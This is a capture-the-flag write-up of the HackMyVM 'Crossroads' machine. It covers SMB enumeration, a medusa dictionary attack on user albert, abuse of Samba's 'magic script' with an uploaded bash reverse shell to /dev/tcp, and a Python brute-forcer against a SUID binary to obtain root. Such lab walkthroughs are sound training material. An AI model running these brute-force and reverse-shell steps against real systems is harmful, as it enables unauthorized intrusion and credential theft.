# Crossroads

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Crossroads | tasiyanci | Beginner | HackMyVM |

**Summary:** The Crossroads machine is a beginner-level challenge on the HackMyVM platform. The attack begins with network reconnaissance revealing an Apache web server and SMB services. Initial access is gained by discovering a password for the SMB user 'albert' through a dictionary attack using `medusa`. After accessing the SMB share, a custom script allows for a reverse shell. Privilege escalation involves analyzing a custom SUID binary named `beroot`. By creating a Python brute-force script to crack the binary's password protection, the root password is retrieved, granting full system access.

---

## Reconnaissance

### Network Scanning

The initial network scan identifies the target IP address as `192.168.100.116`.

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.116 08:00:27:53:DE:C8 VirtualBox
```

### Port Enumeration

A comprehensive Nmap scan reveals two main services: an Apache web server on port 80 and Samba services on ports 139 and 445. The `robots.txt` file on the web server points to a disallowed entry: `/crossroads.png`.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/crossroads]
└─$ nmap -sC -sV -p- -T4 192.168.100.116
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-18 08:20 WIB
Nmap scan report for 192.168.100.116
Host is up (0.0027s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
80/tcp  open  http        Apache httpd 2.4.38 ((Debian))
| http-robots.txt: 1 disallowed entry
|_/crossroads.png
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: 12 Step Treatment Center | Crossroads Centre Antigua
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
Service Info: Host: CROSSROADS

Host script results:
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: crossroads
|   NetBIOS computer name: CROSSROADS\x00
|   Domain name: \x00
|   FQDN: crossroads
|_  System time: 2026-02-17T19:20:27-06:00
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time:
|   date: 2026-02-18T01:20:27
|_  start_date: N/A
|_nbstat: NetBIOS name: CROSSROADS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_clock-skew: mean: 1h59m58s, deviation: 3h27m50s, median: -1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.43 seconds
```

### SMB Enumeration

Attempts to list shares anonymously fail.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/crossroads]
└─$ smbclient -L //192.168.100.116 -N

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        smbshare        Disk
        IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            CROSSROADS
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/crossroads]
└─$ smbclient //192.168.100.116/smbshare -N
tree connect failed: NT_STATUS_ACCESS_DENIED
```

However, `enum4linux` successfully enumerates a user named `albert`.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/crossroads]
└─$ enum4linux -a 192.168.100.116
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Feb 18 08:27:27 2026
...

 ======================================( Users on 192.168.100.116 )======================================

index: 0x1 RID: 0x3e9 acb: 0x00000010 Account: albert   Name:   Desc:

user:[albert] rid:[0x3e9]

 ...
 =================( Users on 192.168.100.116 via RID cycling (RIDS: 500-550,1000-1050) )=================


[I] Found new SID:
S-1-22-1

[I] Found new SID:
S-1-5-32

[I] Found new SID:
S-1-5-32

[I] Found new SID:
S-1-5-32

[I] Found new SID:
S-1-5-32

[+] Enumerating users using SID S-1-5-21-198007098-3908253677-2746664996 and logon username '', password ''

S-1-5-21-198007098-3908253677-2746664996-501 CROSSROADS\nobody (Local User)
S-1-5-21-198007098-3908253677-2746664996-513 CROSSROADS\None (Domain Group)
S-1-5-21-198007098-3908253677-2746664996-1001 CROSSROADS\albert (Local User)

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''

S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\albert (Local User)

 ==============================( Getting printer info for 192.168.100.116 )==============================

No printers returned.


enum4linux complete on Wed Feb 18 08:28:20 2026
```

### Web Enumeration

The `crossroads.png` file found in `robots.txt` is downloaded and analyzed.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/crossroads]
└─$ curl -O http://192.168.100.116/crossroads.png
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0   0     0   0     0     0     0  --:--:-- --:--:-- --:  0     0   0     0   0     0     0     0  --:--:-- --:--:-- --:100  1074k 100  1074k   0     0  5080k     0  --:--:-- --:--:-- --:--:--  5068k
```

![](crossroads.png)

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/crossroads]
└─$ file crossroads.png                                         crossroads.png: PNG image data, 1106 x 876, 8-bit/color RGB, non-interlaced
```

Metadata analysis using `exiftool` reveals that the image was created with Adobe Photoshop CC 2018.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/crossroads]
└─$ exiftool crossroads.png
ExifTool Version Number         : 13.36
File Name                       : crossroads.png
Directory                       : .
File Size                       : 1100 kB
File Modification Date/Time     : 2026:02:18 08:23:08+07:00
File Access Date/Time           : 2026:02:18 08:23:10+07:00
File Inode Change Date/Time     : 2026:02:18 08:23:08+07:00
File Permissions                : -rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 1106
Image Height                    : 876
Bit Depth                       : 8
Color Type                      : RGB
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Pixels Per Unit X               : 2835
Pixels Per Unit Y               : 2835
Pixel Units                     : meters
XMP Toolkit                     : Adobe XMP Core 5.6-c142 79.160924, 2017/07/13-01:06:39
Creator Tool                    : Adobe Photoshop CC 2018 (Windows)
Create Date                     : 2021:03:03 01:05:34+03:00
Metadata Date                   : 2021:03:03 01:05:34+03:00
Modify Date                     : 2021:03:03 01:05:34+03:00
Instance ID                     : xmp.iid:4204c92b-8096-1f44-95a6-bea1cf3b10b1
Document ID                     : adobe:docid:photoshop:332b0d56-e404-b344-995b-0552ba0e91fc
Original Document ID            : xmp.did:099252d2-406b-7a48-8f06-3b7f7410f183
Color Mode                      : RGB
Format                          : image/png
History Action                  : created, saved
History Instance ID             : xmp.iid:099252d2-406b-7a48-8f06-3b7f7410f183, xmp.iid:4204c92b-8096-1f44-95a6-bea1cf3b10b1
History When                    : 2021:03:03 01:05:34+03:00, 2021:03:03 01:05:34+03:00
History Software Agent          : Adobe Photoshop CC 2018 (Windows), Adobe Photoshop CC 2018 (Windows)
History Changed                 : /
Document Ancestors              : F35C96A263F2934D8C732E0185DBC23E
Image Size                      : 1106x876
Megapixels                      : 0.969
```

---

## Initial Access

### Brute Force Attack

With the username `albert` identified from SMB enumeration, a dictionary attack is performed against the SMB service using `medusa` and the `rockyou.txt` wordlist. The password `bradley1` is successfully discovered.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/crossroads]
└─$ medusa -h 192.168.100.116 -u albert -P /usr/share/wordlists/rockyou.txt -M smbnt
Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
...
2026-02-18 09:06:37 ACCOUNT CHECK: [smbnt] Host: 192.168.100.116 (1 of 1, 0 complete) User: albert (1 of 1, 0 complete) Password: eddie1 (3839 of 14344391 complete)
2026-02-18 09:06:37 ACCOUNT CHECK: [smbnt] Host: 192.168.100.116 (1 of 1, 0 complete) User: albert (1 of 1, 0 complete) Password: dodgers (3840 of 14344391 complete)
2026-02-18 09:06:37 ACCOUNT CHECK: [smbnt] Host: 192.168.100.116 (1 of 1, 0 complete) User: albert (1 of 1, 0 complete) Password: cheska (3841 of 14344391 complete)
2026-02-18 09:06:37 ACCOUNT CHECK: [smbnt] Host: 192.168.100.116 (1 of 1, 0 complete) User: albert (1 of 1, 0 complete) Password: bradley1 (3842 of 14344391 complete)
2026-02-18 09:06:37 ACCOUNT FOUND: [smbnt] Host: 192.168.100.116 User: albert Password: bradley1 [SUCCESS (ADMIN$ - Share Unavailable)]
```

### Accessing SMB Shares

Using the credentials `albert:bradley1`, we list the available SMB shares.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/crossroads]
└─$ smbmap -H 192.168.100.116 -u albert -p bradley1
...
[+] IP: 192.168.100.116:445     Name: 192.168.100.116           Status: NULL Session
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  READ ONLY       Printer Drivers
        smbshare                                                READ, WRITE
        IPC$                                                    NO ACCESS       IPC Service (Samba 4.9.5-Debian)
        albert                                                  READ ONLY       Home Directories
...
```

Connecting to the `smbshare` reveals a `smb.conf` file.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/crossroads]
└─$ smbclient //192.168.100.116/smbshare -U albert%bradley1
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Feb 18 09:03:47 2026
  ..                                  D        0  Wed Mar  3 06:16:15 2021
  smb.conf                            N     8779  Wed Mar  3 05:14:54 2021

                4000320 blocks of size 1024. 3759668 blocks available
smb: \> get smb.conf
getting file \smb.conf of size 8779 as smb.conf (451.2 KiloBytes/sec) (average 451.2 KiloBytes/sec)
```

### Exploiting Samba Magic Script

Examining `smb.conf` reveals a misconfiguration: the `magic script` directive is enabled and pointing to `smbscript.sh`.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/crossroads]
└─$ cat smb.conf
...
[smbshare]

path = /home/albert/smbshare
valid users = albert
browsable = yes
writable = yes
read only = no
magic script = smbscript.sh
guest ok = no
```

This configuration allows us to execute arbitrary commands by uploading a script named `smbscript.sh`. We create a reverse shell script:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/crossroads]
└─$ vim smbscript.sh

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/crossroads]
└─$ cat smbscript.sh
#!/bin/bash
bash -i >& /dev/tcp/192.168.100.1/4444 0>&1
```

After setting up a Netcat listener, we upload the script to the share.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/crossroads]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

```smb
smb: \> put smbscript.sh
```

The script executes automatically, providing a reverse shell as user `albert`.

```bash
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 64537
bash: cannot set terminal process group (548): Inappropriate ioctl for device
bash: no job control in this shell
albert@crossroads:/home/albert/smbshare$ id
id
uid=1000(albert) gid=1000(albert) groups=1000(albert)
```

We upgrade the shell to a fully interactive TTY:

```bash
albert@crossroads:/home/albert/smbshare$ which python3
which python3
/usr/bin/python3
albert@crossroads:/home/albert/smbshare$ python3 -c 'import pty; pty.spawn("/bin/bash")'
<re$ python3 -c 'import pty; pty.spawn("/bin/bash")'
albert@crossroads:/home/albert/smbshare$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/crossroads]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

albert@crossroads:/home/albert/smbshare$ export SHELL=bash
albert@crossroads:/home/albert/smbshare$ export TERM=xterm-256color
albert@crossroads:/home/albert/smbshare$ stty rows 50 cols 200
albert@crossroads:/home/albert/smbshare$ reset
```

---

## Privilege Escalation

### SUID Binary Analysis

Enumerating the user's home directory reveals a setuid binary named `beroot`.

```bash
albert@crossroads:/home/albert/smbshare$ ls
smb.conf  smbscript.sh
albert@crossroads:/home/albert/smbshare$ cd ..
albert@crossroads:/home/albert$ ls -la
total 1584
drwxr-xr-x 3 albert albert    4096 Mar  2  2021 .
drwxr-xr-x 3 root   root      4096 Mar  2  2021 ..
-rwsr-xr-x 1 root   root     16664 Mar  2  2021 beroot
-rw-r--r-- 1 albert albert 1583196 Mar  2  2021 crossroads.png
drwxrwxrwx 2 albert albert    4096 Feb 17 20:14 smbshare
-r-x------ 1 albert albert      32 Mar  2  2021 user.txt
```

```bash
albert@crossroads:/home/albert$ file beroot
beroot: setuid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=c1da1f0fded1889d32e27b99a2a4bd170c30349b, for GNU/Linux 3.2.0, not stripped
```

Running the binary prompts for a password, which is unknown. We download the binary to our local machine for analysis.

```bash
albert@crossroads:/home/albert$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/crossroads]
└─$ wget http://192.168.100.116:8080/beroot                     --2026-02-18 09:21:21--  http://192.168.100.116:8080/beroot
Connecting to 192.168.100.116:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16664 (16K) [application/octet-stream]
Saving to: ‘beroot’

beroot          100%[=======>]  16.27K  --.-KB/s    in 0.01s

2026-02-18 09:21:21 (1.48 MB/s) - ‘beroot’ saved [16664/16664]
```

```bash
192.168.100.1 - - [17/Feb/2026 20:21:21] "GET /beroot HTTP/1.1" 200 -
```

### Brute Forcing the Binary

A custom Python script is created to brute-force the `beroot` binary using the `rockyou.txt` wordlist. We first prepare the wordlist.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/crossroads]
└─$ head -n 1000000 /usr/share/wordlists/rockyou.txt > rock_1m.txt
```

Then we create the script `brute.py`:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/crossroads]
└─$ cat brute.py
import subprocess
import sys

binary_path = "/home/albert/beroot"
wordlist_path = "rock_1m.txt"

def brute_force():
    try:
        with open(wordlist_path, 'r', encoding='latin-1') as f:
            print(f"[*] Starting brute force using {wordlist_path}...")

            count = 0
            for line in f:
                password = line.strip()
                if not password:
                    continue

                proc = subprocess.Popen(
                    [binary_path],
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )

                stdout, stderr = proc.communicate(input=password)

                if "wrong" not in stdout.lower() and "wrong" not in stderr.lower():
                    print(f"\n\n[+] PASSWORD FOUND: {password}")
                    print(f"[+] Output:\n{stdout}")
                    return

                count += 1
                if count % 100 == 0:
                    print(f"[*] Tried {count} passwords... (Last: {password})", end='\r')

    except FileNotFoundError:
        print(f"[!] Error: File {wordlist_path} not found!")
    except KeyboardInterrupt:
        print("\n[!] Brute force stopped by user.")

if __name__ == "__main__":
    brute_force()
```

We upload the script and a subset of the wordlist to the target machine via a Python HTTP server.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/crossroads]
└─$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

```bash
albert@crossroads:/home/albert$ wget http://192.168.100.1:8080/rock_1m.txt
--2026-02-17 20:55:33--  http://192.168.100.1:8080/rock_1m.txt
Connecting to 192.168.100.1:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8583864 (8.2M) [text/plain]
Saving to: ‘rock_1m.txt’

rock_1m.txt
100%[=============================================================================================================>]   8.19M  17.3MB/s    in 0.5s

2026-02-17 20:55:34 (17.3 MB/s) - ‘rock_1m.txt’ saved [8583864/8583864]

albert@crossroads:/home/albert$ wget http://192.168.100.1:8080/brute.py
--2026-02-17 20:55:45--  http://192.168.100.1:8080/brute.py
Connecting to 192.168.100.1:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1440 (1.4K) [text/x-python]
Saving to: ‘brute.py’

brute.py
100%[=============================================================================================================>]   1.41K  --.-KB/s    in 0s

2026-02-17 20:55:45 (190 MB/s) - ‘brute.py’ saved [1440/1440]
```

```bash
172.21.32.1 - - [18/Feb/2026 09:55:34] "GET /rock_1m.txt HTTP/1.1" 200 -
172.21.32.1 - - [18/Feb/2026 09:55:46] "GET /brute.py HTTP/1.1" 200 -
```

We run the brute-force script:

```bash
albert@crossroads:/home/albert$ python3 brute.py
[*] Starting brute force using rock_1m.txt...
[*] Tried 1000 passwords... (Last: cassandra)
...
```

The brute force is successful, revealing that the correct password triggers the binary to output credential information.

```bash
enter password for root
-----------------------

do ls and find root creds

albert@crossroads:/home/albert$ ls
beroot  brute.py  crossroads.png  rock_1m.txt  rootcreds  smbshare  user.txt
albert@crossroads:/home/albert$ cat rootcreds
root
___[REDACTED]
```

### Root Access

Using the discovered password `___[REDACTED]`, we switch to the root user.

```bash
albert@crossroads:/home/albert$ su - root
Password:
root@crossroads:~# id
uid=0(root) gid=0(root) groups=0(root)
root@crossroads:~# whoami
root
root@crossroads:~# hostname
crossroads
```

We can now capture both the user and root flags.

```bash
root@crossroads:~# grep "" /root/root.txt /home/albert/user.txt
/root/root.txt:876[REDACTED]
/home/albert/user.txt:912[REDACTED]
```

Post-exploitation analysis of `beroot.sh` (found in `/root`) confirms the logic: it compares the input password against the filename of a file located in `/root/passwd/`.

```bash
root@crossroads:~# ls
beroot.sh  creds  passwd  root.txt
root@crossroads:~# cat beroot.sh
#!/bin/bash

/usr/bin/clear
/usr/bin/echo "enter password for root"
/usr/bin/echo "-----------------------"
/usr/bin/echo ""
read -p "password: " pasw

if [[ "$pasw" == "$(/usr/bin/ls /root/passwd)" ]]; then
        /usr/bin/cat /root/creds > /home/albert/rootcreds
        /usr/bin/echo "do ls and find root creds"
else
        /usr/bin/echo "wrong password!!!"
fi
root@crossroads:~# cd /root/passwd/
root@crossroads:~/passwd# ls -la
total 8
drwxr-xr-x 2 root root 4096 Mar  2  2021 .
drwx------ 4 root root 4096 Feb 17 21:02 ..
-rw-r--r-- 1 root root    0 Mar  2  2021 le[REDACTED]
```

The password for the `beroot` binary was effectively `le[REDACTED]`.

---

## Attack Chain Summary
1. **Reconnaissance**: Discovered open ports 80 (HTTP) and 139/445 (SMB) via Nmap.
2. **Vulnerability Discovery**: Enumerated SMB user `albert` using `enum4linux` and identified a `magic script` misconfiguration in `smb.conf`.
3. **Exploitation**: Brute-forced the SMB password for `albert` (`bradley1`) and uploaded a reverse shell script (`smbscript.sh`) to the `smbshare`, triggering execution via the `magic script` feature.
4. **Internal Enumeration**: Found a custom SUID binary `beroot` in the user's home directory.
5. **Privilege Escalation**: Brute-forced the `beroot` binary locally to reveal the root credentials (`root:___[REDACTED]`), allowing full system compromise.

